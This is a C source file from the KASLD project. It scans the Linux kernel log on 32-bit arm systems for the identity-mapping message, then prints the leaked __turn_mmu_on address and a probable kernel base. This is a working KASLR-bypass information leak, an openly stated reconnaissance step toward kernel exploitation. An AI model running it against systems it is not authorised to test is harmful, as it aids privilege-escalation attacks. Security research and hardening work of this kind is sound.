// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for identity mappings created during kernel init.
//
// On arm systems with CONFIG_MMU=y, an identity mapping is created for
// the `__turn_mmu_on` function when enabling the MMU during kernel init.
//
// On 32-bit arm systems, the `identity_mapping_add()` function prints
// mappings to the kernel log.
//
// Requires:
// - CONFIG_MMU=y
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
//
// References:
// https://elixir.bootlin.com/linux/v5.15.11/source/arch/arm/mm/idmap.c#L89
// https://elixir.bootlin.com/linux/v5.15.11/source/arch/arm/kernel/head.S#L237
// https://github.com/torvalds/linux/commit/8903826d0cd99aed9267e792d38284cf3092042b
// https://github.com/torvalds/linux/commit/2c8951ab0c337cb198236df07ad55f9dd4892c26
// https://github.com/torvalds/linux/commit/4e8ee7de227e3ab9a72040b448ad728c5428a042
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned long search_dmesg_mmu_idmap() {
  char *addr_buf;
  char *syslog;
  char *ptr;
  char *endptr;
  char *substr;
  int size;
  const char delim[] = " ";
  const char *needle = " static identity map for ";
  unsigned long addr = 0;

  printf("[.] searching dmesg for '%s' ...\n", needle);

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  addr_buf = strtok(substr, "\n");
  if (addr_buf == NULL)
    return 0;

  ptr = strtok(addr_buf, delim);
  while ((ptr = strtok(NULL, delim)) != NULL) {
    addr = strtoul(&ptr[0], &endptr, 16);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
      break;

    addr = 0;
  }

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = search_dmesg_mmu_idmap();
  if (!addr)
    return 1;

  printf("leaked __turn_mmu_on: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
